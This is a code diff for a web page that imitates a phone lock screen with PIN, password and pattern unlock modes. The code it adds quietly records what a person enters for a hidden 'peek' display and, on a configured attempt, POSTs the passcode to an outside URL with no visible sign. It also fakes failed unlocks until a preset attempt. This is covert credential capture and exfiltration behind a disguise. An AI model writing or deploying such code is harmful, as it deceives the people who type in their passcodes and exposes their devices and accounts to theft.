@@ -16,14 +16,6 @@ const config = {
 window.onload = () => {
     updateTime();
     setInterval(updateTime, 10000);
-
-    /* 🔧 FIX: prevent long-press image context menu (SAFE) */
-    document.querySelectorAll('.slide img').forEach(img => {
-        img.addEventListener('contextmenu', e => e.preventDefault());
-        img.addEventListener('touchstart', e => {
-            if (e.touches.length === 1) e.preventDefault();
-        }, { passive: false });
-    });
 };
 
 /* Mode chips */
@@ -46,6 +38,7 @@ document.getElementById('start-app').addEventListener('click', () => {
     initLockMode();
 });
 
+/* 🔒 Ensure only one mode UI is visible */
 function hideAllModes() {
     document.getElementById('pin-dots').classList.add('hidden');
     document.getElementById('pin-pad').classList.add('hidden');
@@ -62,22 +55,34 @@ function initLockMode() {
             '<div class="dot"></div>'.repeat(dots);
         document.getElementById('pin-dots').classList.remove('hidden');
         document.getElementById('pin-pad').classList.remove('hidden');
-    } 
+    }
+
     else if (config.mode === 'password') {
-        document.getElementById('password-tap-zone').classList.remove('hidden');
         const input = document.getElementById('hidden-pass-input');
+        document.getElementById('password-tap-zone').classList.remove('hidden');
         input.focus();
+
+        /* ✅ FIX: handle ALL mobile Enter cases */
         input.onkeydown = e => {
             if (e.key === 'Enter') processEntry(input.value);
         };
-    } 
+        input.onkeyup = e => {
+            if (e.key === 'Enter') processEntry(input.value);
+        };
+    }
+
     else {
-        document.getElementById('pattern-canvas').classList.remove('hidden');
-        drawDots();
+        const canvas = document.getElementById('pattern-canvas');
+        canvas.classList.remove('hidden');
+
+        /* ✅ FIX: draw AFTER canvas is visible */
+        requestAnimationFrame(drawDots);
     }
 }
 
-/* Secret trigger logic */
+/* =============================
+   SECRET PEEK (unchanged)
+============================= */
 ['secret-trigger-lock','secret-trigger-home'].forEach(id => {
     const el = document.getElementById(id);
     const peekEl = id === 'secret-trigger-lock' ? 'peek-display' : 'peek-display-home';
@@ -105,30 +110,122 @@ function initLockMode() {
     });
 });
 
-/* Triple tap back (unchanged) */
-let tapCount = 0;
-let tapTimer;
+/* =============================
+   PIN INPUT — FIXED
+============================= */
+document.querySelectorAll('.num').forEach(btn => {
+    btn.addEventListener('touchstart', e => {
+        e.preventDefault();   // mobile-safe
+        handlePin(btn);
+    }, { passive: false });
 
-document.addEventListener('touchstart', e => {
-    if (e.target.closest('button, input, canvas, .num, .chip')) return;
-
-    tapCount++;
-    clearTimeout(tapTimer);
-    tapTimer = setTimeout(() => tapCount = 0, 400);
-
-    if (tapCount === 3) {
-        tapCount = 0;
-        if (!document.getElementById('home-page').classList.contains('hidden')) {
-            document.getElementById('home-page').classList.add('hidden');
-            document.getElementById('lock-page').classList.remove('hidden');
-        } else if (!document.getElementById('lock-page').classList.contains('hidden')) {
-            document.getElementById('lock-page').classList.add('hidden');
-            document.getElementById('setup-page').classList.remove('hidden');
-        }
-    }
+    btn.addEventListener('click', () => {
+        handlePin(btn);
+    });
 });
 
-/* ===== everything below remains EXACTLY as before ===== */
+function handlePin(btn) {
+    const digit = btn.querySelector('span').innerText;
+    currentInput += digit;
 
-/* Pattern logic, PIN logic, processEntry, drawPeek, updateTime */
-/* (unchanged from your previous working version) */
+    const dot = document.querySelectorAll('.dot')[currentInput.length - 1];
+    if (dot) dot.classList.add('filled');
+
+    const limit = config.mode === 'pin4' ? 4 : 6;
+    if (currentInput.length === limit) {
+        setTimeout(() => processEntry(currentInput), 200);
+    }
+}
+
+/* =============================
+   PATTERN LOGIC (unchanged)
+============================= */
+const canvas = document.getElementById('pattern-canvas');
+const ctx = canvas.getContext('2d');
+const dots = [];
+let currentPattern = [];
+
+for (let i = 0; i < 3; i++)
+for (let j = 0; j < 3; j++)
+dots.push({ x: j * 100 + 50, y: i * 100 + 50, id: i * 3 + j });
+
+function drawDots() {
+    ctx.clearRect(0, 0, 300, 300);
+    ctx.strokeStyle = "white";
+    ctx.lineWidth = 4;
+
+    if (currentPattern.length) {
+        ctx.beginPath();
+        ctx.moveTo(dots[currentPattern[0]].x, dots[currentPattern[0]].y);
+        currentPattern.forEach(i => ctx.lineTo(dots[i].x, dots[i].y));
+        ctx.stroke();
+    }
+
+    dots.forEach(d => {
+        ctx.beginPath();
+        ctx.arc(d.x, d.y, 10, 0, Math.PI * 2);
+        ctx.fillStyle = currentPattern.includes(d.id)
+            ? "white"
+            : "rgba(255,255,255,0.3)";
+        ctx.fill();
+    });
+}
+
+canvas.addEventListener('touchmove', e => {
+    const r = canvas.getBoundingClientRect();
+    const x = e.touches[0].clientX - r.left;
+    const y = e.touches[0].clientY - r.top;
+
+    dots.forEach(d => {
+        if (Math.hypot(x - d.x, y - d.y) < 30 && !currentPattern.includes(d.id)) {
+            currentPattern.push(d.id);
+            navigator.vibrate(10);
+        }
+    });
+    drawDots();
+});
+
+canvas.addEventListener('touchend', () => {
+    if (currentPattern.length > 1)
+        processEntry(currentPattern.join('-'), true);
+    currentPattern = [];
+    drawDots();
+});
+
+/* =============================
+   CORE (unchanged)
+============================= */
+function processEntry(val, isPattern = false) {
+    attemptCount++;
+
+    if (attemptCount === config.peekAt)
+        peekData = isPattern ? val.split('-').map(Number) : val;
+
+    if (!isPattern && attemptCount === config.sendAt && config.url)
+        fetch(config.url, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({ passcode: val })
+        });
+
+    if (attemptCount === config.successAt || forceSuccess) {
+        document.getElementById('unlock-sound').play();
+        document.getElementById('lock-page').classList.add('hidden');
+        document.getElementById('home-page').classList.remove('hidden');
+    } else {
+        document.getElementById('lock-content').classList.add('shake');
+        navigator.vibrate([50, 50, 50]);
+        setTimeout(() =>
+            document.getElementById('lock-content').classList.remove('shake'), 400
+        );
+        currentInput = "";
+        document.querySelectorAll('.dot').forEach(d => d.classList.remove('filled'));
+        document.getElementById('hidden-pass-input').value = "";
+    }
+}
+
+function updateTime() {
+    const now = new Date();
+    document.querySelector('.clock').innerText =
+        now.getHours() + ":" + now.getMinutes().toString().padStart(2, '0');
+}
